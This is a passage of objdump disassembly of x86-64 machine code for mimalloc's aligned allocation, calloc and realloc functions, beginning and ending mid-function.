  40433a:	48 89 c2             	mov    %rax,%rdx
  40433d:	4c 89 d6             	mov    %r10,%rsi
  404340:	e9 5b de ff ff       	jmpq   4021a0 <_mi_page_malloc_zeroed>
  404345:	0f 1f 00             	nopl   (%rax)
  404348:	48 89 d1             	mov    %rdx,%rcx
  40434b:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  404351:	48 89 f2             	mov    %rsi,%rdx
  404354:	48 89 c6             	mov    %rax,%rsi
  404357:	e9 c4 f9 ff ff       	jmpq   403d20 <mi_heap_malloc_zero_aligned_at_generic>
  40435c:	0f 1f 40 00          	nopl   0x0(%rax)
  404360:	31 c0                	xor    %eax,%eax
  404362:	c3                   	retq   
  404363:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  40436a:	00 00 00 00 
  40436e:	66 90                	xchg   %ax,%ax

0000000000404370 <mi_zalloc_aligned>:
  404370:	48 89 f8             	mov    %rdi,%rax
  404373:	48 89 f2             	mov    %rsi,%rdx
  404376:	48 85 f6             	test   %rsi,%rsi
  404379:	74 65                	je     4043e0 <mi_zalloc_aligned+0x70>
  40437b:	4c 8d 46 ff          	lea    -0x1(%rsi),%r8
  40437f:	4c 85 c6             	test   %r8,%rsi
  404382:	75 5c                	jne    4043e0 <mi_zalloc_aligned+0x70>
  404384:	48 c7 c1 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rcx
  40438b:	64 48 8b 39          	mov    %fs:(%rcx),%rdi
  40438f:	48 3d 00 04 00 00    	cmp    $0x400,%rax
  404395:	77 31                	ja     4043c8 <mi_zalloc_aligned+0x58>
  404397:	48 39 f0             	cmp    %rsi,%rax
  40439a:	72 2c                	jb     4043c8 <mi_zalloc_aligned+0x58>
  40439c:	48 8d 48 07          	lea    0x7(%rax),%rcx
  4043a0:	48 c1 e9 03          	shr    $0x3,%rcx
  4043a4:	48 8b b4 cf f8 00 00 	mov    0xf8(%rdi,%rcx,8),%rsi
  4043ab:	00 
  4043ac:	48 8b 4e 10          	mov    0x10(%rsi),%rcx
  4043b0:	48 85 c9             	test   %rcx,%rcx
  4043b3:	74 13                	je     4043c8 <mi_zalloc_aligned+0x58>
  4043b5:	4c 85 c1             	test   %r8,%rcx
  4043b8:	75 0e                	jne    4043c8 <mi_zalloc_aligned+0x58>
  4043ba:	48 89 c2             	mov    %rax,%rdx
  4043bd:	e9 de dd ff ff       	jmpq   4021a0 <_mi_page_malloc_zeroed>
  4043c2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4043c8:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  4043ce:	31 c9                	xor    %ecx,%ecx
  4043d0:	48 89 c6             	mov    %rax,%rsi
  4043d3:	e9 48 f9 ff ff       	jmpq   403d20 <mi_heap_malloc_zero_aligned_at_generic>
  4043d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  4043df:	00 
  4043e0:	31 c0                	xor    %eax,%eax
  4043e2:	c3                   	retq   
  4043e3:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  4043ea:	00 00 00 00 
  4043ee:	66 90                	xchg   %ax,%ax

00000000004043f0 <mi_calloc_aligned_at>:
  4043f0:	49 89 d1             	mov    %rdx,%r9
  4043f3:	48 83 ff 01          	cmp    $0x1,%rdi
  4043f7:	74 0b                	je     404404 <mi_calloc_aligned_at+0x14>
  4043f9:	48 89 f8             	mov    %rdi,%rax
  4043fc:	48 f7 e6             	mul    %rsi
  4043ff:	48 89 c6             	mov    %rax,%rsi
  404402:	70 5c                	jo     404460 <mi_calloc_aligned_at+0x70>
  404404:	4d 85 c9             	test   %r9,%r9
  404407:	74 57                	je     404460 <mi_calloc_aligned_at+0x70>
  404409:	49 8d 51 ff          	lea    -0x1(%r9),%rdx
  40440d:	49 85 d1             	test   %rdx,%r9
  404410:	75 4e                	jne    404460 <mi_calloc_aligned_at+0x70>
  404412:	48 c7 c0 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rax
  404419:	64 48 8b 38          	mov    %fs:(%rax),%rdi
  40441d:	48 81 fe 00 04 00 00 	cmp    $0x400,%rsi
  404424:	77 42                	ja     404468 <mi_calloc_aligned_at+0x78>
  404426:	49 39 f1             	cmp    %rsi,%r9
  404429:	77 3d                	ja     404468 <mi_calloc_aligned_at+0x78>
  40442b:	48 8d 46 07          	lea    0x7(%rsi),%rax
  40442f:	48 c1 e8 03          	shr    $0x3,%rax
  404433:	4c 8b 84 c7 f8 00 00 	mov    0xf8(%rdi,%rax,8),%r8
  40443a:	00 
  40443b:	49 8b 40 10          	mov    0x10(%r8),%rax
  40443f:	48 85 c0             	test   %rax,%rax
  404442:	74 24                	je     404468 <mi_calloc_aligned_at+0x78>
  404444:	48 01 c8             	add    %rcx,%rax
  404447:	48 85 d0             	test   %rdx,%rax
  40444a:	75 1c                	jne    404468 <mi_calloc_aligned_at+0x78>
  40444c:	48 89 f2             	mov    %rsi,%rdx
  40444f:	4c 89 c6             	mov    %r8,%rsi
  404452:	e9 49 dd ff ff       	jmpq   4021a0 <_mi_page_malloc_zeroed>
  404457:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40445e:	00 00 
  404460:	31 c0                	xor    %eax,%eax
  404462:	c3                   	retq   
  404463:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  404468:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  40446e:	4c 89 ca             	mov    %r9,%rdx
  404471:	e9 aa f8 ff ff       	jmpq   403d20 <mi_heap_malloc_zero_aligned_at_generic>
  404476:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  40447d:	00 00 00 

0000000000404480 <mi_calloc_aligned>:
  404480:	49 89 d1             	mov    %rdx,%r9
  404483:	48 83 ff 01          	cmp    $0x1,%rdi
  404487:	74 0b                	je     404494 <mi_calloc_aligned+0x14>
  404489:	48 89 f8             	mov    %rdi,%rax
  40448c:	48 f7 e6             	mul    %rsi
  40448f:	48 89 c6             	mov    %rax,%rsi
  404492:	70 54                	jo     4044e8 <mi_calloc_aligned+0x68>
  404494:	4d 85 c9             	test   %r9,%r9
  404497:	74 4f                	je     4044e8 <mi_calloc_aligned+0x68>
  404499:	49 8d 51 ff          	lea    -0x1(%r9),%rdx
  40449d:	49 85 d1             	test   %rdx,%r9
  4044a0:	75 46                	jne    4044e8 <mi_calloc_aligned+0x68>
  4044a2:	48 c7 c0 f0 ff ff ff 	mov    $0xfffffffffffffff0,%rax
  4044a9:	64 48 8b 38          	mov    %fs:(%rax),%rdi
  4044ad:	48 81 fe 00 04 00 00 	cmp    $0x400,%rsi
  4044b4:	77 3a                	ja     4044f0 <mi_calloc_aligned+0x70>
  4044b6:	49 39 f1             	cmp    %rsi,%r9
  4044b9:	77 35                	ja     4044f0 <mi_calloc_aligned+0x70>
  4044bb:	48 8d 46 07          	lea    0x7(%rsi),%rax
  4044bf:	48 c1 e8 03          	shr    $0x3,%rax
  4044c3:	48 8b 8c c7 f8 00 00 	mov    0xf8(%rdi,%rax,8),%rcx
  4044ca:	00 
  4044cb:	48 8b 41 10          	mov    0x10(%rcx),%rax
  4044cf:	48 85 c0             	test   %rax,%rax
  4044d2:	74 1c                	je     4044f0 <mi_calloc_aligned+0x70>
  4044d4:	48 85 d0             	test   %rdx,%rax
  4044d7:	75 17                	jne    4044f0 <mi_calloc_aligned+0x70>
  4044d9:	48 89 f2             	mov    %rsi,%rdx
  4044dc:	48 89 ce             	mov    %rcx,%rsi
  4044df:	e9 bc dc ff ff       	jmpq   4021a0 <_mi_page_malloc_zeroed>
  4044e4:	0f 1f 40 00          	nopl   0x0(%rax)
  4044e8:	31 c0                	xor    %eax,%eax
  4044ea:	c3                   	retq   
  4044eb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4044f0:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  4044f6:	31 c9                	xor    %ecx,%ecx
  4044f8:	4c 89 ca             	mov    %r9,%rdx
  4044fb:	e9 20 f8 ff ff       	jmpq   403d20 <mi_heap_malloc_zero_aligned_at_generic>

0000000000404500 <mi_heap_realloc_aligned_at>:
  404500:	41 57                	push   %r15
  404502:	41 56                	push   %r14
  404504:	49 89 ce             	mov    %rcx,%r14
  404507:	41 55                	push   %r13
  404509:	41 54                	push   %r12
  40450b:	55                   	push   %rbp
  40450c:	53                   	push   %rbx
  40450d:	48 89 d3             	mov    %rdx,%rbx
  404510:	48 83 ec 18          	sub    $0x18,%rsp
  404514:	48 83 f9 08          	cmp    $0x8,%rcx
  404518:	0f 86 9a 00 00 00    	jbe    4045b8 <mi_heap_realloc_aligned_at+0xb8>
  40451e:	4c 89 c1             	mov    %r8,%rcx
  404521:	48 85 f6             	test   %rsi,%rsi
  404524:	0f 84 a6 00 00 00    	je     4045d0 <mi_heap_realloc_aligned_at+0xd0>
  40452a:	49 89 ff             	mov    %rdi,%r15
  40452d:	48 89 f7             	mov    %rsi,%rdi
  404530:	4c 89 44 24 08       	mov    %r8,0x8(%rsp)
  404535:	49 89 f5             	mov    %rsi,%r13
  404538:	e8 83 d9 ff ff       	callq  401ec0 <mi_usable_size>
  40453d:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
  404542:	48 39 c3             	cmp    %rax,%rbx
  404545:	48 89 c5             	mov    %rax,%rbp
  404548:	77 20                	ja     40456a <mi_heap_realloc_aligned_at+0x6a>
  40454a:	48 d1 e8             	shr    %rax
  40454d:	48 89 ea             	mov    %rbp,%rdx
  404550:	48 29 c2             	sub    %rax,%rdx
  404553:	48 39 d3             	cmp    %rdx,%rbx
  404556:	72 12                	jb     40456a <mi_heap_realloc_aligned_at+0x6a>
  404558:	49 8d 44 0d 00       	lea    0x0(%r13,%rcx,1),%rax
  40455d:	31 d2                	xor    %edx,%edx
  40455f:	4d 89 ec             	mov    %r13,%r12
  404562:	49 f7 f6             	div    %r14
  404565:	48 85 d2             	test   %rdx,%rdx
  404568:	74 36                	je     4045a0 <mi_heap_realloc_aligned_at+0xa0>
  40456a:	45 31 c0             	xor    %r8d,%r8d
  40456d:	4c 89 f2             	mov    %r14,%rdx
  404570:	48 89 de             	mov    %rbx,%rsi
  404573:	4c 89 ff             	mov    %r15,%rdi
  404576:	e8 75 f8 ff ff       	callq  403df0 <mi_heap_malloc_zero_aligned_at>
  40457b:	49 89 c4             	mov    %rax,%r12
  40457e:	48 85 c0             	test   %rax,%rax
  404581:	74 1d                	je     4045a0 <mi_heap_realloc_aligned_at+0xa0>
  404583:	48 39 eb             	cmp    %rbp,%rbx
  404586:	48 89 ea             	mov    %rbp,%rdx
  404589:	48 89 c7             	mov    %rax,%rdi
  40458c:	4c 89 ee             	mov    %r13,%rsi
  40458f:	48 0f 46 d3          	cmovbe %rbx,%rdx
  404593:	e8 08 c9 ff ff       	callq  400ea0 <memcpy@plt>
  404598:	4c 89 ef             	mov    %r13,%rdi
  40459b:	e8 c0 d6 ff ff       	callq  401c60 <mi_free>
  4045a0:	48 83 c4 18          	add    $0x18,%rsp
  4045a4:	4c 89 e0             	mov    %r12,%rax
  4045a7:	5b                   	pop    %rbx
  4045a8:	5d                   	pop    %rbp
  4045a9:	41 5c                	pop    %r12
  4045ab:	41 5d                	pop    %r13
  4045ad:	41 5e                	pop    %r14
  4045af:	41 5f                	pop    %r15
  4045b1:	c3                   	retq   
  4045b2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4045b8:	48 83 c4 18          	add    $0x18,%rsp
  4045bc:	31 c9                	xor    %ecx,%ecx
  4045be:	5b                   	pop    %rbx
  4045bf:	5d                   	pop    %rbp
  4045c0:	41 5c                	pop    %r12
  4045c2:	41 5d                	pop    %r13
  4045c4:	41 5e                	pop    %r14
  4045c6:	41 5f                	pop    %r15
  4045c8:	e9 53 e2 ff ff       	jmpq   402820 <_mi_heap_realloc_zero>
  4045cd:	0f 1f 00             	nopl   (%rax)
  4045d0:	48 83 c4 18          	add    $0x18,%rsp
  4045d4:	4c 89 f2             	mov    %r14,%rdx
  4045d7:	48 89 de             	mov    %rbx,%rsi
  4045da:	45 31 c0             	xor    %r8d,%r8d
  4045dd:	5b                   	pop    %rbx
  4045de:	5d                   	pop    %rbp
  4045df:	41 5c                	pop    %r12
  4045e1:	41 5d                	pop    %r13
  4045e3:	41 5e                	pop    %r14
  4045e5:	41 5f                	pop    %r15
  4045e7:	e9 04 f8 ff ff       	jmpq   403df0 <mi_heap_malloc_zero_aligned_at>
  4045ec:	0f 1f 40 00          	nopl   0x0(%rax)

00000000004045f0 <mi_heap_realloc_aligned>:
  4045f0:	49 89 d3             	mov    %rdx,%r11
  4045f3:	49 89 ca             	mov    %rcx,%r10
  4045f6:	48 83 f9 08          	cmp    $0x8,%rcx
  4045fa:	76 24                	jbe    404620 <mi_heap_realloc_aligned+0x30>
  4045fc:	48 89 f0             	mov    %rsi,%rax
  4045ff:	31 d2                	xor    %edx,%edx
  404601:	48 f7 f1             	div    %rcx
  404604:	48 85 f6             	test   %rsi,%rsi
  404607:	74 27                	je     404630 <mi_heap_realloc_aligned+0x40>
  404609:	49 89 d0             	mov    %rdx,%r8
  40460c:	45 31 c9             	xor    %r9d,%r9d
  40460f:	4c 89 da             	mov    %r11,%rdx
  404612:	e9 49 f8 ff ff       	jmpq   403e60 <mi_heap_realloc_zero_aligned_at.part.0>
  404617:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40461e:	00 00 
  404620:	31 c9                	xor    %ecx,%ecx
  404622:	e9 f9 e1 ff ff       	jmpq   402820 <_mi_heap_realloc_zero>
  404627:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40462e:	00 00 
  404630:	48 89 d1             	mov    %rdx,%rcx
  404633:	45 31 c0             	xor    %r8d,%r8d
  404636:	4c 89 d2             	mov    %r10,%rdx
  404639:	4c 89 de             	mov    %r11,%rsi
  40463c:	e9 af f7 ff ff       	jmpq   403df0 <mi_heap_malloc_zero_aligned_at>
  404641:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  404648:	00 00 00 00 
  40464c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000404650 <mi_heap_rezalloc_aligned_at>:
  404650:	41 57                	push   %r15
  404652:	41 56                	push   %r14
  404654:	49 89 ce             	mov    %rcx,%r14
  404657:	41 55                	push   %r13
  404659:	41 54                	push   %r12
  40465b:	55                   	push   %rbp
  40465c:	48 89 d5             	mov    %rdx,%rbp
  40465f:	53                   	push   %rbx
  404660:	48 83 ec 18          	sub    $0x18,%rsp
  404664:	48 83 f9 08          	cmp    $0x8,%rcx
  404668:	0f 86 9a 00 00 00    	jbe    404708 <mi_heap_rezalloc_aligned_at+0xb8>
  40466e:	4c 89 c1             	mov    %r8,%rcx
  404671:	48 85 f6             	test   %rsi,%rsi
  404674:	0f 84 ae 00 00 00    	je     404728 <mi_heap_rezalloc_aligned_at+0xd8>
  40467a:	49 89 ff             	mov    %rdi,%r15
  40467d:	48 89 f7             	mov    %rsi,%rdi
  404680:	4c 89 44 24 08       	mov    %r8,0x8(%rsp)
  404685:	48 89 f3             	mov    %rsi,%rbx
  404688:	e8 33 d8 ff ff       	callq  401ec0 <mi_usable_size>
  40468d:	48 8b 4c 24 08       	mov    0x8(%rsp),%rcx
  404692:	48 39 c5             	cmp    %rax,%rbp
  404695:	49 89 c4             	mov    %rax,%r12
  404698:	0f 87 b2 00 00 00    	ja     404750 <mi_heap_rezalloc_aligned_at+0x100>
  40469e:	48 d1 e8             	shr    %rax
  4046a1:	4c 89 e2             	mov    %r12,%rdx
  4046a4:	48 29 c2             	sub    %rax,%rdx
  4046a7:	48 39 d5             	cmp    %rdx,%rbp
  4046aa:	72 11                	jb     4046bd <mi_heap_rezalloc_aligned_at+0x6d>
  4046ac:	48 8d 04 0b          	lea    (%rbx,%rcx,1),%rax
  4046b0:	31 d2                	xor    %edx,%edx
  4046b2:	49 89 dd             	mov    %rbx,%r13
  4046b5:	49 f7 f6             	div    %r14
  4046b8:	48 85 d2             	test   %rdx,%rdx
  4046bb:	74 36                	je     4046f3 <mi_heap_rezalloc_aligned_at+0xa3>
  4046bd:	45 31 c0             	xor    %r8d,%r8d
  4046c0:	4c 89 f2             	mov    %r14,%rdx
  4046c3:	48 89 ee             	mov    %rbp,%rsi
  4046c6:	4c 89 ff             	mov    %r15,%rdi
  4046c9:	e8 22 f7 ff ff       	callq  403df0 <mi_heap_malloc_zero_aligned_at>
  4046ce:	49 89 c5             	mov    %rax,%r13
  4046d1:	48 85 c0             	test   %rax,%rax
  4046d4:	74 4a                	je     404720 <mi_heap_rezalloc_aligned_at+0xd0>
  4046d6:	4c 39 e5             	cmp    %r12,%rbp
  4046d9:	4c 89 e2             	mov    %r12,%rdx
  4046dc:	4c 89 ef             	mov    %r13,%rdi
  4046df:	48 89 de             	mov    %rbx,%rsi
  4046e2:	48 0f 46 d5          	cmovbe %rbp,%rdx
  4046e6:	e8 b5 c7 ff ff       	callq  400ea0 <memcpy@plt>
  4046eb:	48 89 df             	mov    %rbx,%rdi
  4046ee:	e8 6d d5 ff ff       	callq  401c60 <mi_free>
  4046f3:	48 83 c4 18          	add    $0x18,%rsp
  4046f7:	4c 89 e8             	mov    %r13,%rax
  4046fa:	5b                   	pop    %rbx
  4046fb:	5d                   	pop    %rbp
  4046fc:	41 5c                	pop    %r12
  4046fe:	41 5d                	pop    %r13
  404700:	41 5e                	pop    %r14
  404702:	41 5f                	pop    %r15
  404704:	c3                   	retq   
  404705:	0f 1f 00             	nopl   (%rax)
  404708:	48 83 c4 18          	add    $0x18,%rsp
  40470c:	b9 01 00 00 00       	mov    $0x1,%ecx
  404711:	5b                   	pop    %rbx
  404712:	5d                   	pop    %rbp
  404713:	41 5c                	pop    %r12
  404715:	41 5d                	pop    %r13
  404717:	41 5e                	pop    %r14
  404719:	41 5f                	pop    %r15
  40471b:	e9 00 e1 ff ff       	jmpq   402820 <_mi_heap_realloc_zero>
  404720:	45 31 ed             	xor    %r13d,%r13d
  404723:	eb ce                	jmp    4046f3 <mi_heap_rezalloc_aligned_at+0xa3>
  404725:	0f 1f 00             	nopl   (%rax)
  404728:	48 83 c4 18          	add    $0x18,%rsp
  40472c:	4c 89 f2             	mov    %r14,%rdx
  40472f:	48 89 ee             	mov    %rbp,%rsi
  404732:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  404738:	5b                   	pop    %rbx
  404739:	5d                   	pop    %rbp
  40473a:	41 5c                	pop    %r12
  40473c:	41 5d                	pop    %r13
  40473e:	41 5e                	pop    %r14
  404740:	41 5f                	pop    %r15
  404742:	e9 a9 f6 ff ff       	jmpq   403df0 <mi_heap_malloc_zero_aligned_at>
  404747:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40474e:	00 00 
  404750:	45 31 c0             	xor    %r8d,%r8d
  404753:	4c 89 f2             	mov    %r14,%rdx
  404756:	48 89 ee             	mov    %rbp,%rsi
  404759:	4c 89 ff             	mov    %r15,%rdi
  40475c:	e8 8f f6 ff ff       	callq  403df0 <mi_heap_malloc_zero_aligned_at>
  404761:	49 89 c5             	mov    %rax,%r13
  404764:	48 85 c0             	test   %rax,%rax
  404767:	74 b7                	je     404720 <mi_heap_rezalloc_aligned_at+0xd0>
  404769:	49 83 fc 08          	cmp    $0x8,%r12
  40476d:	bf 08 00 00 00       	mov    $0x8,%edi
  404772:	48 89 ea             	mov    %rbp,%rdx
  404775:	49 0f 43 fc          	cmovae %r12,%rdi
  404779:	31 f6                	xor    %esi,%esi
  40477b:	48 83 ef 08          	sub    $0x8,%rdi
  40477f:	48 29 fa             	sub    %rdi,%rdx
  404782:	4c 01 ef             	add    %r13,%rdi
  404785:	e8 d6 c6 ff ff       	callq  400e60 <memset@plt>
  40478a:	e9 47 ff ff ff       	jmpq   4046d6 <mi_heap_rezalloc_aligned_at+0x86>
  40478f:	90                   	nop

0000000000404790 <mi_heap_rezalloc_aligned>:
  404790:	49 89 d3             	mov    %rdx,%r11
  404793:	49 89 ca             	mov    %rcx,%r10
  404796:	48 83 f9 08          	cmp    $0x8,%rcx
  40479a:	76 24                	jbe    4047c0 <mi_heap_rezalloc_aligned+0x30>
  40479c:	48 89 f0             	mov    %rsi,%rax
  40479f:	31 d2                	xor    %edx,%edx
  4047a1:	48 f7 f1             	div    %rcx
  4047a4:	48 85 f6             	test   %rsi,%rsi
  4047a7:	74 27                	je     4047d0 <mi_heap_rezalloc_aligned+0x40>
  4047a9:	49 89 d0             	mov    %rdx,%r8
  4047ac:	41 b9 01 00 00 00    	mov    $0x1,%r9d
  4047b2:	4c 89 da             	mov    %r11,%rdx
  4047b5:	e9 a6 f6 ff ff       	jmpq   403e60 <mi_heap_realloc_zero_aligned_at.part.0>
  4047ba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4047c0:	b9 01 00 00 00       	mov    $0x1,%ecx
  4047c5:	e9 56 e0 ff ff       	jmpq   402820 <_mi_heap_realloc_zero>
  4047ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  4047d0:	48 89 d1             	mov    %rdx,%rcx
  4047d3:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  4047d9:	4c 89 d2             	mov    %r10,%rdx
  4047dc:	4c 89 de             	mov    %r11,%rsi
  4047df:	e9 0c f6 ff ff       	jmpq   403df0 <mi_heap_malloc_zero_aligned_at>
  4047e4:	66 66 2e 0f 1f 84 00 	data16 nopw %cs:0x0(%rax,%rax,1)
  4047eb:	00 00 00 00 
  4047ef:	90                   	nop

00000000004047f0 <mi_heap_recalloc_aligned_at>:
  4047f0:	41 57                	push   %r15
  4047f2:	49 89 ff             	mov    %rdi,%r15
  4047f5:	41 56                	push   %r14
  4047f7:	41 55                	push   %r13
  4047f9:	4d 89 c5             	mov    %r8,%r13
  4047fc:	41 54                	push   %r12
  4047fe:	55                   	push   %rbp
  4047ff:	48 89 f5             	mov    %rsi,%rbp
  404802:	53                   	push   %rbx
  404803:	48 89 cb             	mov    %rcx,%rbx
  404806:	48 83 ec 18          	sub    $0x18,%rsp
  40480a:	48 83 fa 01          	cmp    $0x1,%rdx
  40480e:	74 0f                	je     40481f <mi_heap_recalloc_aligned_at+0x2f>
  404810:	48 89 d0             	mov    %rdx,%rax
  404813:	48 f7 e1             	mul    %rcx
  404816:	48 89 c3             	mov    %rax,%rbx
  404819:	0f 80 a1 00 00 00    	jo     4048c0 <mi_heap_recalloc_aligned_at+0xd0>
  40481f:	49 83 fd 08          	cmp    $0x8,%r13
  404823:	0f 86 e7 00 00 00    	jbe    404910 <mi_heap_recalloc_aligned_at+0x120>
  404829:	48 85 ed             	test   %rbp,%rbp
  40482c:	0f 84 06 01 00 00    	je     404938 <mi_heap_recalloc_aligned_at+0x148>
  404832:	48 89 ef             	mov    %rbp,%rdi
  404835:	4c 89 4c 24 08       	mov    %r9,0x8(%rsp)
  40483a:	e8 81 d6 ff ff       	callq  401ec0 <mi_usable_size>
  40483f:	4c 8b 4c 24 08       	mov    0x8(%rsp),%r9
  404844:	48 39 c3             	cmp    %rax,%rbx
  404847:	49 89 c4             	mov    %rax,%r12
  40484a:	77 7c                	ja     4048c8 <mi_heap_recalloc_aligned_at+0xd8>
  40484c:	48 d1 e8             	shr    %rax
  40484f:	4c 89 e1             	mov    %r12,%rcx
  404852:	48 29 c1             	sub    %rax,%rcx
  404855:	48 39 cb             	cmp    %rcx,%rbx
  404858:	72 12                	jb     40486c <mi_heap_recalloc_aligned_at+0x7c>
  40485a:	4a 8d 44 0d 00       	lea    0x0(%rbp,%r9,1),%rax
  40485f:	31 d2                	xor    %edx,%edx
  404861:	49 89 ee             	mov    %rbp,%r14
  404864:	49 f7 f5             	div    %r13
  404867:	48 85 d2             	test   %rdx,%rdx
  40486a:	74 39                	je     4048a5 <mi_heap_recalloc_aligned_at+0xb5>
  40486c:	45 31 c0             	xor    %r8d,%r8d
  40486f:	4c 89 c9             	mov    %r9,%rcx
  404872:	4c 89 ea             	mov    %r13,%rdx
  404875:	48 89 de             	mov    %rbx,%rsi
  404878:	4c 89 ff             	mov    %r15,%rdi
  40487b:	e8 70 f5 ff ff       	callq  403df0 <mi_heap_malloc_zero_aligned_at>
  404880:	49 89 c6             	mov    %rax,%r14
  404883:	48 85 c0             	test   %rax,%rax
  404886:	74 38                	je     4048c0 <mi_heap_recalloc_aligned_at+0xd0>
  404888:	4c 39 e3             	cmp    %r12,%rbx
  40488b:	4c 89 e2             	mov    %r12,%rdx
  40488e:	4c 89 f7             	mov    %r14,%rdi
  404891:	48 89 ee             	mov    %rbp,%rsi
  404894:	48 0f 46 d3          	cmovbe %rbx,%rdx
  404898:	e8 03 c6 ff ff       	callq  400ea0 <memcpy@plt>
  40489d:	48 89 ef             	mov    %rbp,%rdi
  4048a0:	e8 bb d3 ff ff       	callq  401c60 <mi_free>
  4048a5:	48 83 c4 18          	add    $0x18,%rsp
  4048a9:	4c 89 f0             	mov    %r14,%rax
  4048ac:	5b                   	pop    %rbx
  4048ad:	5d                   	pop    %rbp
  4048ae:	41 5c                	pop    %r12
  4048b0:	41 5d                	pop    %r13
  4048b2:	41 5e                	pop    %r14
  4048b4:	41 5f                	pop    %r15
  4048b6:	c3                   	retq   
  4048b7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4048be:	00 00 
  4048c0:	45 31 f6             	xor    %r14d,%r14d
  4048c3:	eb e0                	jmp    4048a5 <mi_heap_recalloc_aligned_at+0xb5>
  4048c5:	0f 1f 00             	nopl   (%rax)
  4048c8:	45 31 c0             	xor    %r8d,%r8d
  4048cb:	4c 89 c9             	mov    %r9,%rcx
  4048ce:	4c 89 ea             	mov    %r13,%rdx
  4048d1:	48 89 de             	mov    %rbx,%rsi
  4048d4:	4c 89 ff             	mov    %r15,%rdi
  4048d7:	e8 14 f5 ff ff       	callq  403df0 <mi_heap_malloc_zero_aligned_at>
  4048dc:	49 89 c6             	mov    %rax,%r14
  4048df:	48 85 c0             	test   %rax,%rax
  4048e2:	74 dc                	je     4048c0 <mi_heap_recalloc_aligned_at+0xd0>
  4048e4:	49 83 fc 08          	cmp    $0x8,%r12
  4048e8:	bf 08 00 00 00       	mov    $0x8,%edi
  4048ed:	48 89 da             	mov    %rbx,%rdx
  4048f0:	49 0f 43 fc          	cmovae %r12,%rdi
  4048f4:	31 f6                	xor    %esi,%esi
  4048f6:	48 83 ef 08          	sub    $0x8,%rdi
  4048fa:	48 29 fa             	sub    %rdi,%rdx
  4048fd:	4c 01 f7             	add    %r14,%rdi
  404900:	e8 5b c5 ff ff       	callq  400e60 <memset@plt>
  404905:	eb 81                	jmp    404888 <mi_heap_recalloc_aligned_at+0x98>
  404907:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40490e:	00 00 
  404910:	48 83 c4 18          	add    $0x18,%rsp
  404914:	48 89 da             	mov    %rbx,%rdx
  404917:	48 89 ee             	mov    %rbp,%rsi
  40491a:	4c 89 ff             	mov    %r15,%rdi
  40491d:	5b                   	pop    %rbx
  40491e:	b9 01 00 00 00       	mov    $0x1,%ecx
  404923:	5d                   	pop    %rbp
  404924:	41 5c                	pop    %r12
  404926:	41 5d                	pop    %r13
  404928:	41 5e                	pop    %r14
  40492a:	41 5f                	pop    %r15
  40492c:	e9 ef de ff ff       	jmpq   402820 <_mi_heap_realloc_zero>
  404931:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  404938:	48 83 c4 18          	add    $0x18,%rsp
  40493c:	4c 89 ea             	mov    %r13,%rdx
  40493f:	48 89 de             	mov    %rbx,%rsi
  404942:	4c 89 ff             	mov    %r15,%rdi
  404945:	5b                   	pop    %rbx
  404946:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  40494c:	5d                   	pop    %rbp
  40494d:	4c 89 c9             	mov    %r9,%rcx
  404950:	41 5c                	pop    %r12
  404952:	41 5d                	pop    %r13
  404954:	41 5e                	pop    %r14
  404956:	41 5f                	pop    %r15
  404958:	e9 93 f4 ff ff       	jmpq   403df0 <mi_heap_malloc_zero_aligned_at>
  40495d:	0f 1f 00             	nopl   (%rax)

0000000000404960 <mi_heap_recalloc_aligned>:
  404960:	41 57                	push   %r15
  404962:	49 89 ff             	mov    %rdi,%r15
  404965:	41 56                	push   %r14
  404967:	41 55                	push   %r13
  404969:	41 54                	push   %r12
  40496b:	4d 89 c4             	mov    %r8,%r12
  40496e:	55                   	push   %rbp
  40496f:	48 89 f5             	mov    %rsi,%rbp
  404972:	53                   	push   %rbx
  404973:	48 89 cb             	mov    %rcx,%rbx
  404976:	48 83 ec 18          	sub    $0x18,%rsp
  40497a:	48 83 fa 01          	cmp    $0x1,%rdx
  40497e:	74 0f                	je     40498f <mi_heap_recalloc_aligned+0x2f>
  404980:	48 89 d0             	mov    %rdx,%rax
  404983:	48 f7 e1             	mul    %rcx
  404986:	48 89 c3             	mov    %rax,%rbx
  404989:	0f 80 01 01 00 00    	jo     404a90 <mi_heap_recalloc_aligned+0x130>
  40498f:	49 83 fc 08          	cmp    $0x8,%r12
  404993:	0f 86 a7 00 00 00    	jbe    404a40 <mi_heap_recalloc_aligned+0xe0>
  404999:	48 89 e8             	mov    %rbp,%rax
  40499c:	31 d2                	xor    %edx,%edx
  40499e:	49 f7 f4             	div    %r12
  4049a1:	48 89 d1             	mov    %rdx,%rcx
  4049a4:	48 85 ed             	test   %rbp,%rbp
  4049a7:	0f 84 bb 00 00 00    	je     404a68 <mi_heap_recalloc_aligned+0x108>
  4049ad:	48 89 ef             	mov    %rbp,%rdi
  4049b0:	48 89 54 24 08       	mov    %rdx,0x8(%rsp)
